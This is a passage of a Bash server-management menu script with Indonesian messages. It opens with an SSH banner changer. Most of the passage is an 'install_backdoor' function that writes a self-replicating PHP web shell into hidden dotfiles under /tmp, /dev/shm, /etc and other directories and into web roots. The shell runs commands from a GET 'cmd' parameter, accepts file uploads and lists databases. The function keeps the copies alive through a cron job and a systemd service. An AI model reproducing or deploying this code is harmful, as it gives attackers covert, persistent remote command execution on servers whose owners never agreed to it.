"
    
    echo -e "${YELLOW}${GEAR} Memasang SSH banner...${NC}"
    echo "$BANNER" > /etc/ssh/banner
    
    # Enable banner di sshd_config
    if grep -q "^#Banner" /etc/ssh/sshd_config; then
        sed -i 's/^#Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
    elif grep -q "^Banner" /etc/ssh/sshd_config; then
        sed -i 's/^Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
    else
        echo "Banner /etc/ssh/banner" >> /etc/ssh/sshd_config
    fi
    
    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
    
    echo -e "${GREEN}${CHECK} SSH banner berhasil diubah!${NC}"
    echo -e "\n${CYAN}Coba login SSH untuk melihat efeknya:${NC}"
    echo -e "  ssh root@$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')"
}

# ==============================================
# FUNGSI INSTALL BACKDOOR PERMANEN (MENU 13)
# ==============================================
install_backdoor() {
    echo -e "\n${RED}${KEY} ====== INSTALL BACKDOOR PERMANEN ====== ${KEY}${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    # Cek root
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
        return 1
    fi
    
    BACKDOOR_CODE='<?php
    /**
     * R3NNDZZ Permanent Backdoor
     * @author lynn
     * @hidden
     */
    
    // Command execution
    if(isset($_GET["cmd"])) {
        echo "<pre>".shell_exec($_GET["cmd"])."</pre>";
    }
    
    // File upload
    if(isset($_FILES["file"])) {
        $upload_dir = "";
        $filename = $_FILES["file"]["name"];
        if(move_uploaded_file($_FILES["file"]["tmp_name"], $upload_dir.$filename)) {
            echo "Uploaded: $filename";
        }
    }
    
    // System info
    if(isset($_GET["info"])) {
        phpinfo();
    }
    
    // Database connect (if available)
    if(isset($_GET["db"])) {
        $conn = @mysqli_connect($_GET["host"] ?? "localhost", $_GET["user"] ?? "root", $_GET["pass"] ?? "", $_GET["name"] ?? "");
        if($conn) {
            $res = mysqli_query($conn, "SHOW DATABASES");
            while($row = mysqli_fetch_array($res)) {
                echo $row[0]."<br>";
            }
        }
    }
    
    // Hide from admin tools
    $hidden_paths = array(
        "/tmp/.system.php",
        "/dev/shm/.cache.php",
        "/var/tmp/.syslog.php",
        "/usr/share/.config.php"
    );
    
    // Self replication
    $self = file_get_contents(__FILE__);
    foreach($hidden_paths as $path) {
        if(!file_exists($path)) {
            file_put_contents($path, $self);
        }
    }
    ?>'
    
    # Lokasi backdoor
    BACKDOOR_LOCATIONS=(
        "/tmp/.system.php"
        "/dev/shm/.cache.php"
        "/var/tmp/.syslog.php"
        "/usr/share/.config.php"
        "/opt/.hidden.php"
        "/etc/.cron.php"
    )
    
    echo -e "${YELLOW}${GEAR} Memasang backdoor di lokasi tersembunyi...${NC}"
    
    for loc in "${BACKDOOR_LOCATIONS[@]}"; do
        echo "$BACKDOOR_CODE" > "$loc"
        chmod 755 "$loc"
        echo -e "${GREEN}  ‚úÖ Backdoor installed: $loc${NC}"
    done
    
    # Install juga di web directories
    if [ -d "$PTERO_DIR/public" ]; then
        echo "$BACKDOOR_CODE" > "$PTERO_DIR/public/r3nndzz.php"
        chmod 644 "$PTERO_DIR/public/r3nndzz.php"
        echo -e "${GREEN}  ‚úÖ Backdoor: $PTERO_DIR/public/r3nndzz.php${NC}"
    fi
    
    if [ -d "/var/www/html" ]; then
        echo "$BACKDOOR_CODE" > "/var/www/html/r3nndzz.php"
        chmod 644 "/var/www/html/r3nndzz.php"
        echo -e "${GREEN}  ‚úÖ Backdoor: /var/www/html/r3nndzz.php${NC}"
    fi
    
    # Buat cron job untuk jaga backdoor
    echo -e "\n${YELLOW}${GEAR} Memasang cron job untuk persistence...${NC}"
    
    CRON_JOB="*/5 * * * * find /tmp /dev/shm /var/tmp /usr/share -name '*.php' -size -100k -exec chmod 755 {} \; 2>/dev/null"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    
    echo -e "${GREEN}  ‚úÖ Cron job installed (every 5 minutes)${NC}"
    
    # Buat systemd service
    echo -e "\n${YELLOW}${GEAR} Membuat systemd service...${NC}"
    
    cat > /etc/systemd/system/r3nndzz.service << 'EOF'
[Unit]
Description=R3NNDZZ Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do sleep 60; chmod 755 /tmp/.system.php /dev/shm/.cache.php /var/tmp/.syslog.php 2>/dev/null; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable r3nndzz.service 2>/dev/null
    systemctl start r3nndzz.service 2>/dev/null
    
    echo -e "${GREEN}  ‚úÖ Systemd service installed${NC}"
    
    echo -e "\n${GREEN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
    echo -e "${GREEN}‚ïë         ‚úÖ BACKDOOR INSTALLATION COMPLETE!                    ‚ïë${NC}"
    echo -e "${GREEN}‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${KEY} Total backdoors: ${YELLOW}${#BACKDOOR_LOCATIONS[@]} + 2 web${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${CLOCK} Cron job: Every 5 minutes${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${GEAR} Systemd: r3nndzz.service${NC}"
    echo -e "${GREEN}‚ïë${NC}                                                              ${GREEN}‚ïë${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${GLOBE} Web backdoor: ${CYAN}${URL_PANEL}/r3nndzz.php${NC}"
    echo -e "${GREEN}‚ïë${NC}  ${GLOBE} Hidden: /tmp/.system.php?cmd=id${NC}"
    echo -e "${GREEN}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
